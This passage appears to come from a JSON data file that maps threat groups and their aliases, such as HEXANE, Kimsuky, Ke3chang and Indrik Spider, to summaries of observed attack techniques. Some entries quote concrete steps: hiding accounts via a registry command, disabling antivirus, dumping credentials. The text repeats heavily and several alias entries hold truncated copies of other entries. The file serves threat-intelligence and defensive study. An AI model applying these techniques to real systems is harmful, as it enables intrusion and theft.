drives on targeted hosts., During HomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data., HEXANE has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers., HEXANE has established email accounts for use in domain registration including for ProtonMail addresses., HEXANE has used WMI event subscriptions for persistence., During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers., HEXANE has used cloud services, including OneDrive, for data exfiltration., For HomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access., HEXANE has identified specific potential victims at targeted organizations.",
    "Siamesekitten": "HEXANE has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome., During HomeLand Justice, threat actors used ROADSWEEP ransomware to encrypt files on targeted systems., During HomeLand Justice, threat actors used a version of ZeroCleare to wipe disk drives on targeted hosts., During HomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data., HEXANE has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers., HEXANE has established email accounts for use in domain registration including for ProtonMail addresses., HEXANE has used WMI event subscriptions for persistence., During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers., HEXANE has used cloud services, including OneDrive, for data exfiltration., For HomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access., HEXANE has identified specific potential victims at targeted organizations., HEXANE has targeted executives, human resources staff, and IT personnel for spearphishing., HEXANE has identified executives, HR, and IT staff at victim organizations for further targeting., During HomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus., During HomeLand Justice, threat actors deleted Windows events and application logs., HEXANE has downloaded additional payloads and malicious scripts onto a compromised host.During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure., During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure., HEXANE has used a PowerShell-based keylogger named kl.ps1., HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access., During HomeLand Justice, threat actors initiated a process named Mellona.exe to spread the ROADSWEEP file encryptor and a persistence script to a list of internal machines., During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe., During HomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems., HEXANE has used Base64-encoded scripts., HEXANE has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net.During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket., During HomeLand Justice",
    "Spirlin": "HEXANE has used a PowerShell-based keylogger named kl.ps1., HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access., During HomeLand Justice, threat actors initiated a process named Mellona.exe to spread the ROADSWEEP file encryptor and a persistence script to a list of internal machines., During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe., During HomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems., HEXANE has used Base64-encoded scripts., HEXANE has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net.During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket., During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket., During HomeLand Justice, threat actors used tools with legitimate code signing certificates. , During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts., HEXANE has run net localgroup to enumerate local groups., HEXANE has enumerated processes on targeted systems., HEXANE has used remote desktop sessions for lateral movement.During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment., During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment., During HomeLand Justice, threat actors used SMB for lateral movement., HEXANE has used net view to enumerate domain machines., HEXANE has used a scheduled task to establish persistence for a keylogger., For HomeLand Justice, threat actors used .aspx webshells named pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence., HEXANE has enumerated programs installed on an infected machine., HEXANE has staged malware on fraudulent websites set up to impersonate targeted organizations., HEXANE has collected the hostname of a compromised machine., HEXANE has used Ping and tracert for network discovery., HEXANE has used tools including BITSAdmin to test internet connectivity from compromised hosts., HEXANE has used netstat to monitor connections to specific ports., HEXANE has run whoami on compromised machines to identify the current user., HEXANE has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware., During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket., HEXANE has used cloud services, including OneDrive, for C2., During HomeLand Justice, threat actors used WMI to modify Windows Defender settings.",
    "Higaisa": "Higaisa is a threat group suspected to have South Korean origins. Higaisa has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. Higaisa was first disclosed in early 2019 but is assessed to have operated as early as 2009., Higaisa used HTTP and HTTPS to send data back to its C2 server., Higaisa added a spoofed binary to the start-up folder for persistence., Higaisa used cmd.exe for execution., Higaisa has used VBScript code on the victim's machine., Higaisa used JavaScript to execute additional files., Higaisa used a FakeTLS session for C2 communications., Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data., Higaisa used AES-128 to encrypt C2 traffic., Higaisa exfiltrated data over its C2 channel., Higaisa has exploited CVE-2018-0798 for execution., Higaisa used a payload that creates a hidden window., Higaisa’s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library., Higaisa named a shellcode loader binary svchast.exe to spoof the legitimate svchost.exe. , Higaisa has called various native OS APIs., Higaisa performed padding with null bytes before calculating its hash., Higaisa used Base64 encoded compressed payloads., Higaisa has sent spearphishing emails containing malicious attachments. , Higaisa’s shellcode attempted to find the process ID of the current process., Higaisa discovered system proxy settings and used them if available., Higaisa dropped and added officeupdate.exe to scheduled tasks., Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes., Higaisa collected the system volume serial number, GUID, and computer name., Higaisa used ipconfig to gather network configuration information., Higaisa used a function to gather the current time., Higaisa used malicious e-mail attachments to lure victims into executing LNK files., Higaisa used an XSL file to run VBScript code.",
    "INC Ransom": "INC Ransom is a ransomware and data extortion threat group associated with the deployment of INC Ransomware that has been active since at least July 2023. INC Ransom  has targeted organizations worldwide most commonly in the industrial, healthcare, and education sectors in the US and Europe., , INC Ransom has scanned for domain admin accounts in compromised environments., INC Ransom has used valid accounts over RDP to connect to targeted systems., INC Ransom has used 7-Zip and WinRAR to archive collected data prior to exfiltration., INC Ransom has used cmd.exe to launch malicious payloads., INC Ransom has used INC Ransomware to encrypt victim's data., INC Ransom has staged data on compromised hosts prior to exfiltration., INC Ransom has exploited known vulnerabilities including CVE-2023-3519 in Citrix NetScaler for initial access., INC Ransom has stolen and encrypted victim's data in order to extort payment for keeping it private or decrypting it., INC Ransom can use SystemSettingsAdminFlows.exe, a native Windows utility, to disable Windows Defender., INC Ransom has uninstalled tools from compromised endpoints after use., INC Ransom has downloaded tools to compromised servers including Advanced IP Scanner. , INC Ransom has used a rapid succession of copy commands to install a file encryption executable across multiple endpoints within compromised infrastructure., INC Ransom has named a PsExec executable winupd to mimic a legitimate Windows update file., INC Ransom has used NETSCAN.EXE for internal reconnaissance., INC Ransom has used Internet Explorer to view folders on other systems., INC Ransom has acquired and used several tools including MegaSync, AnyDesk,  esentutl and PsExec., INC Ransom has enumerated domain groups on targeted hosts., INC Ransom has used phishing to gain initial access., INC Ransom has used AnyDesk and PuTTY on compromised systems., INC Ransom has used RDP to move laterally., INC Ransom has used RDP to test network connections., INC Ransom has run a file encryption executable via Service Control Manager/7045;winupd,%SystemRoot%/winupd.exe,user mode service,demand start,LocalSystem., INC Ransom has used Megasync to exfiltrate data to the cloud., INC Ransom has used compromised valid accounts for access to victim environments., INC Ransom has used WMIC to deploy ransomware.",
    "GOLD IONIC": "INC Ransom has used NETSCAN.EXE for internal reconnaissance., INC Ransom has used Internet Explorer to view folders on other systems., INC Ransom has acquired and used several tools including MegaSync, AnyDesk,  esentutl and PsExec., INC Ransom has enumerated domain groups on targeted hosts., INC Ransom has used phishing to gain initial access., INC Ransom has used AnyDesk and PuTTY on compromised systems., INC Ransom has used RDP to move laterally., INC Ransom has used RDP to test network connections., INC Ransom has run a file encryption executable via Service Control Manager/7045;winupd,%SystemRoot%/winupd.exe,user mode service,demand start,LocalSystem., INC Ransom has used Megasync to exfiltrate data to the cloud., INC Ransom has used compromised valid accounts for access to victim environments., INC Ransom has used WMIC to deploy ransomware.",
    "Inception": "Inception is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East., , , Inception has used HTTP, HTTPS, and WebDav in network communications., Inception has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run/., Inception has used PowerShell to execute malicious commands and payloads., Inception has used VBScript to execute malicious commands and payloads., Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex., Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host., Inception has encrypted network communications with AES., Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution., Inception used a file listing plugin to collect information about file and directories both on local and remote drives., Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption., Inception has obtained and used open-source tools such as LaZagne., Inception has used specific malware modules to gather domain membership., Inception has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise., Inception has used a reconnaissance module to identify active processes and other associated loaded modules., Inception used chains of compromised routers to proxy C2 communications between them and cloud service providers., Inception has enumerated installed software on compromised systems., Inception has used malicious HTA files to drop and execute malware., Inception has ensured persistence at system boot by setting the value regsvr32 %path%/ctfmonrn.dll /s., Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host., Inception has used decoy documents to load malicious remote payloads via HTTP., Inception lured victims into clicking malicious files for machine reconnaissance and to execute malware., Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.",
    "Inception Framework": " Inception has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run/., Inception has used PowerShell to execute malicious commands and payloads., Inception has used VBScript to execute malicious commands and payloads., Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex., Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host., Inception has encrypted network communications with AES., Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution., Inception used a file listing plugin to collect information about file and directories both on local and remote drives., Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption., Inception has obtained and used open-source tools such as LaZagne.",
    "IndigoZebra": "IndigoZebra is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014., IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations., IndigoZebra created Dropbox accounts for their operations., IndigoZebra has compromised legitimate email accounts to use in their spearphishing operations., IndigoZebra has downloaded additional files and tools from its C2 server., IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations. , IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments., IndigoZebra sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.",
    "Indrik Spider": "Indrik Spider is a Russia-based cybercriminal group that has been active since at least 2014. Indrik Spider initially started with the Dridex banking Trojan, and then by 2017 they began running ransomware operations using BitPaymer, WastedLocker, and Hades ransomware. Following U.S. sanctions and an indictment in 2019, Indrik Spider changed their tactics and diversified their toolset., , , , , Indrik Spider has purchased access to victim VPNs to facilitate access to victim environments. , Indrik Spider has used PowerShell Empire for execution of malware. , Indrik Spider has used batch scripts on victim's machines., Indrik Spider has used malicious JavaScript files for several components of their attack., Indrik Spider has served fake updates via legitimate websites that have been compromised. , Indrik Spider used wmic.exe to add a new user to the system., Indrik Spider has created local system accounts and has added the accounts to privileged groups., Indrik Spider has accessed and exported passwords from password managers., Indrik Spider has encrypted domain-controlled systems using BitPaymer. Additionally, Indrik Spider used PsExec to execute a ransomware script., Indrik Spider has stored collected data in a .tmp file., Indrik Spider has developed malware for their operations, including ransomware such as BitPaymer and WastedLocker., Indrik Spider has used Group Policy Objects to deploy batch scripts., Indrik Spider has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details., Indrik Spider has exfiltrated data using Rclone or MEGASync prior to deploying ransomware., Indrik Spider has downloaded tools, such as the Advanced Port Scanner utility and Lansweeper, to conduct internal reconnaissance of the victim network. Indrik Spider has also accessed the victim’s VMware VCenter, which had information about host configuration, clusters, etc., Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring. Indrik Spider has used MpCmdRun to revert the definitions in Microsoft Defender. Additionally, Indrik Spider has used WMI to stop or uninstall and reset anti-virus products and other defensive services., Indrik Spider has used Cobalt Strike to empty log files. Additionally, Indrik Spider has cleared all event logs using wevutil. , Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host., Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors., Indrik Spider has modified registry keys to prepare for ransomware execution and to disable common administrative utilities., Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump., Indrik Spider has used a service account to extract copies of the Security Registry hive., Indrik Spider has used RDP for lateral movement., Indrik Spider has used SSH for lateral movement., Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database., Indrik Spider has used PsExec to stop services prior to the execution of ransomware., Indrik Spider has conducted Kerberoasting attacks using a module from GitHub., Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system. , Indrik Spider has searched files to obtain and exfiltrate credentials., Indrik Spider has attempted to get users to click on a malicious zipped file. , Indrik Spider has used valid accounts for initial access and lateral movement. Indrik Spider has also maintained access to the victim environment through the VPN infrastructure., Indrik Spider has collected credentials from infected systems, including domain accounts., Indrik Spider has used WMIC to execute commands on remote computers.",
    "Evil Corp": "Indrik Spider has used malicious JavaScript files for several components of their attack., Indrik Spider has served fake updates via legitimate websites that have been compromised. , Indrik Spider used wmic.exe to add a new user to the system., Indrik Spider has created local system accounts and has added the accounts to privileged groups., Indrik Spider has accessed and exported passwords from password managers., Indrik Spider has encrypted domain-controlled systems using BitPaymer. Additionally, Indrik Spider used PsExec to execute a ransomware script., Indrik Spider has stored collected data in a .tmp file., Indrik Spider has developed malware for their operations, including ransomware such as BitPaymer and WastedLocker., Indrik Spider has used Group Policy Objects to deploy batch scripts., Indrik Spider has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details., Indrik Spider has exfiltrated data using Rclone or MEGASync prior to deploying ransomware., Indrik Spider has downloaded tools, such as the Advanced Port Scanner utility and Lansweeper, to conduct internal reconnaissance of the victim network. Indrik Spider has also accessed the victim’s VMware VCenter, which had information about host configuration, clusters, etc., Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.",
    "Manatee Tempest": "Indrik Spider has modified registry keys to prepare for ransomware execution and to disable common administrative utilities., Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump., Indrik Spider has used a service account to extract copies of the Security Registry hive., Indrik Spider has used RDP for lateral movement., Indrik Spider has used SSH for lateral movement., Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database., Indrik Spider has used PsExec to stop services prior to the execution of ransomware., Indrik Spider has conducted Kerberoasting attacks using a module from GitHub., Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system. , Indrik Spider has searched files to obtain and exfiltrate credentials., Indrik Spider has attempted to get users to click on a malicious zipped file. , Indrik Spider has used valid accounts for initial access and lateral movement. Indrik Spider has also maintained access to the victim environment through the VPN infrastructure., Indrik Spider has collected credentials from infected systems, including domain accounts., Indrik Spider has used WMIC to execute commands on remote computers.",
    "Ke3chang": "Ke3chang is a threat group attributed to actors operating out of China. Ke3chang has targeted oil, government, diplomatic, military, and NGOs in Central and South America, the Caribbean, Europe, and North America since at least 2010., , , , , , , , , Ke3chang performs account discovery using commands such as net localgroup administrators and net group 'REDACTED' /domain on specific permissions groups., Ke3chang performs account discovery using commands such as net localgroup administrators and net group 'REDACTED' /domain on specific permissions groups., Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2., Ke3chang malware RoyalDNS has used DNS for C2., The Ke3chang group has been known to compress data before exfiltration., Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration., Ke3chang has performed frequent and scheduled data collection from victim networks., Ke3chang has performed  frequent and scheduled data exfiltration from compromised networks., Several Ke3chang backdoors achieved persistence by adding a Run key., Malware used by Ke3chang can run commands on the command-line interface., Ke3chang has used batch scripts in its malware to install persistence mechanisms., Ke3chang backdoor RoyalDNS established persistence through adding a service called Nwsapagent., Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember., Ke3chang gathered information and files from local directories for exfiltration., Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them., Ke3chang has developed custom malware that allowed them to maintain persistence on victim networks., Ke3chang has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes., Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations., Ke3chang has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers., Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates., Ke3chang uses command-line interaction to search files and directories., Ke3chang has used tools to download files to compromised machines., Ke3chang has used keyloggers., Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files., Ke3chang has dropped their malware into legitimate installed software paths including: C:/ProgramFiles/Realtek/Audio/HDA/AERTSr.exe, C:/Program Files (x86)/Foxit Software/Foxit Reader/FoxitRdr64.exe, C:/Program Files (x86)/Adobe/Flash Player/AddIns/airappinstaller/airappinstall.exe, and C:/Program Files (x86)/Adobe/Acrobat Reader DC/Reader/AcroRd64.exe., Ke3chang has used Base64-encoded shellcode strings., Ke3chang has obtained and used tools such as Mimikatz., Ke3chang has dumped credentials, including by using Mimikatz., Ke3chang has dumped credentials, including by using gsecdump., Ke3chang has used NTDSDump and other password dumping tools to gather credentials., Ke3chang has dumped credentials, including by using gsecdump., Ke3chang performs discovery of permission groups net group /domain., Ke3chang performs process discovery using tasklist commands., Ke3chang actors have been known to copy files to the network shares of other computers to move laterally., Ke3chang has used network scanning and enumeration tools, including Ping., Ke3chang has used Mimikatz to generate Kerberos golden tickets., Ke3chang performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name., Ke3chang has used implants to collect the system language ID of a compromised machine., Ke3chang has performed local network configuration discovery using ipconfig., Ke3chang performs local network connection discovery using netstat., Ke3chang has used implants capable of collecting the signed-in username., Ke3chang performs service discovery using net start commands., Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries., Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts., Ke3chang has used compromised credentials to sign into victims’ Microsoft 365 accounts.",
    "APT15": " Ke3chang performs account discovery using commands such as net localgroup administrators and net group 'REDACTED' /domain on specific permissions groups., Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2., Ke3chang malware RoyalDNS has used DNS for C2., The Ke3chang group has been known to compress data before exfiltration., Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration., Ke3chang has performed frequent and scheduled data collection from victim networks., Ke3chang has performed  frequent and scheduled data exfiltration from compromised networks., Several Ke3chang backdoors achieved persistence by adding a Run key., Malware used by Ke3chang can run commands on the command-line interface., Ke3chang has used batch scripts in its malware to install persistence mechanisms., Ke3chang backdoor RoyalDNS established persistence through adding a service called Nwsapagent., Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember., Ke3chang gathered information and files from local directories for exfiltration., Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them., Ke3chang has developed custom malware that allowed them to maintain persistence on victim networks.",
    "Mirage": "Ke3chang has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes., Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations., Ke3chang has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers., Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates., Ke3chang uses command-line interaction to search files and directories., Ke3chang has used tools to download files to compromised machines., Ke3chang has used keyloggers., Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files., Ke3chang has dropped their malware into legitimate installed software paths including: C:/ProgramFiles/Realtek/Audio/HDA/AERTSr.exe, C:/Program Files (x86)/Foxit Software/Foxit Reader/FoxitRdr64.exe, C:/Program Files (x86)/Adobe/Flash Player/AddIns/airappinstaller/airappinstall.exe, and C:/Program Files (x86)/Adobe/Acrobat Reader DC/Reader/AcroRd64.exe., Ke3chang has used Base64-encoded shellcode strings., Ke3chang has obtained and used tools such as Mimikatz., Ke3chang has dumped credentials, including by using Mimikatz., Ke3chang has dumped credentials, including by using gsecdump., Ke3chang has used NTDSDump and other password dumping tools to gather credentials., Ke3chang has dumped credentials, including by using gsecdump., Ke3chang performs discovery of permission groups net group /domain.",
    "Vixen Panda": "Ke3chang has dropped their malware into legitimate installed software paths including: C:/ProgramFiles/Realtek/Audio/HDA/AERTSr.exe, C:/Program Files (x86)/Foxit Software/Foxit Reader/FoxitRdr64.exe, C:/Program Files (x86)/Adobe/Flash Player/AddIns/airappinstaller/airappinstall.exe, and C:/Program Files (x86)/Adobe/Acrobat Reader DC/Reader/AcroRd64.exe., Ke3chang has used Base64-encoded shellcode strings., Ke3chang has obtained and used tools such as Mimikatz., Ke3chang has dumped credentials, including by using Mimikatz., Ke3chang has dumped credentials, including by using gsecdump., Ke3chang has used NTDSDump and other password dumping tools to gather credentials., Ke3chang has dumped credentials, including by using gsecdump., Ke3chang performs discovery of permission groups net group /domain., Ke3chang performs process discovery using tasklist commands., Ke3chang actors have been known to copy files to the network shares of other computers to move laterally., Ke3chang has used network scanning and enumeration tools, including Ping., Ke3chang has used Mimikatz to generate Kerberos golden tickets., Ke3chang performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name., Ke3chang has used implants to collect the system language ID of a compromised machine., Ke3chang has performed local network configuration discovery using ipconfig., Ke3chang performs local network connection discovery using netstat., Ke3chang has used implants capable of collecting the signed-in username., Ke3chang performs service discovery using net start commands., Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries., Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts., Ke3chang has used compromised credentials to sign into victims’ Microsoft 365 accounts.",
    "Kimsuky": "Kimsuky is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the UN and the government, education, business services, and manufacturing sectors in the United States, Japan, Russia, and Europe. Kimsuky has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions. Kimsuky operations have overlapped with those of other North Korean cyber espionage actors likely as a result of ad hoc collaborations or other limited resource sharing., Kimsuky was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019)., North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups., , , , , , , Kimsuky has added accounts to specific groups with net localgroup., Kimsuky has used funds from stolen and laundered cryptocurrency to acquire operational infrastructure., Kimsuky has registered domains to spoof targeted organizations and trusted third parties including search engines, web platforms, and cryptocurrency exchanges., Kimsuky has purchased hosting servers with virtual currency and prepaid cards., Kimsuky has hosted content used for targeting efforts via web services such as Blogspot., Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website., Kimsuky  has used HTTP GET and POST requests for C2., Kimsuky has used FTP to download additional malware to the target machine., Kimsuky has used e-mail to send exfiltrated data to C2 servers., Kimsuky has used QuickZip to archive stolen files before exfiltration., Kimsuky has used RC4 encryption before exfil., Kimsuky has placed scripts in the startup folder for persistence and modified the HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce Registry key., Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies., Kimsuky has executed a variety of PowerShell scripts including Invoke-Mimikatz., Kimsuky has executed Windows commands by using cmd and running batch scripts., Kimsuky has used Visual Basic to download malicious payloads. Kimsuky has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure., Kimsuky has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data., Kimsuky has used JScript for logging and downloading additional tools., Kimsuky has compromised email accounts to send spearphishing e-mails., Kimsuky has compromised legitimate sites and used them to distribute malware., Kimsuky has created accounts with net user., Kimsuky has created new services for persistence., Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers. Kimsuky has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims., Kimsuky has collected Office, PDF, and HWP documents from its victims., Kimsuky has staged collected data files under C:/Program Files/Common Files/System/Ole DB/., Kimsuky has decoded malicious VBScripts using Base64., Kimsuky created and used a mailing toolkit to use in spearphishing attacks., Kimsuky has developed its own unique malware such as MailFetch.py for use in operations., Kimsuky has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP., Kimsuky has set auto-forward rules on victim's e-mail accounts., Kimsuky has created social media accounts to monitor news and security trends as well as potential targets., Kimsuky has created email accounts for phishing operations., Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents., Kimsuky has exfiltrated data over its C2 channel., Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts., Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688., Kimsuky has used RDP to establish persistence., Kimsuky has the ability to enumerate all files and directories on an infected system., Kimsuky has stolen and laundered cryptocurrency to self-fund operations including the acquisition of infrastructure., Kimsuky has collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering., Kimsuky has collected victim employee name information., Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others., Kimsuky has run reg add ‘HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts/UserList’ /v to hide a newly created user., Kimsuky has used an information gathering module that will hide an AV software window from the victim., Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user., Kimsuky has been observed disabling the system firewall., Kimsuky has deleted the exfiltrated data on disk after transmission. Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk., Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics., Kimsuky has downloaded additional scripts, tools, and malware onto victim systems., Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes., Kimsuky has sent internal spearphishing emails for lateral movement after stealing victim information., Kimsuky has disguised services to appear as benign software or related to operating system functions., Kimsuky has renamed malware to legitimate names such as ESTCommon.dll or patch.dll., Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence., Kimsuky has used a proprietary tool to intercept one time passwords required for two-factor authentication., Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols., Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding. Kimsuky has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format., Kimsuky has packed malware with UPX., Kimsuky has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec., Kimsuky has obtained exploit code for various CVEs., Kimsuky has gathered credentials using Mimikatz and ProcDump., Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns., Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain., Kimsuky has used tailored spearphishing emails to gather victim information including contat lists to identify additional targets., Kimsuky has used links in e-mail to steal account information including web beacons for target profiling., Kimsuky can gather a list of all processes running on a victim's machine., Kimsuky has used Win7Elevate to inject malicious code into explorer.exe., Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing., Kimsuky has obtained specific Registry keys and values on a compromised host., Kimsuky has used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory., Kimsuky has used a modified TeamViewer client as a command and control channel., Kimsuky has used RDP for direct remote point-and-click access., Kimsuky has downloaded additional malware with scheduled tasks., Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails., Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims., Kimsuky has searched for information on the target company's website., Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding 'Dinosaur' references within the code., Kimsuky has checked for the presence of antivirus software with powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct., Kimsuky has used compromised and acquired infrastructure to host and deliver malware including Blogspot to host beacons, file exfiltrators, and implants., Kimsuky has signed files with the name EGIS CO,. Ltd.., Kimsuky has used mshta.exe to run malicious scripts on the system., Kimsuky has executed malware with regsvr32s., Kimsuky has used rundll32.exe to execute malicious scripts and malware on a victim's network., Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the 'systeminfo' command., Kimsuky has used ipconfig/all and web beacons sent via email to gather network configuration information., Kimsuky has used an instrumentor script to gather the names of all services running on a victim's system., Kimsuky has used tools that are capable of obtaining credentials from saved mail., Kimsuky has used pass the hash for authentication to remote access software used in C2., Kimsuky has lured victims into clicking malicious links., Kimsuky has used attempted to lure victims into opening malicious e-mail attachments., Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP., Kimsuky has used Blogspot pages for C2.",
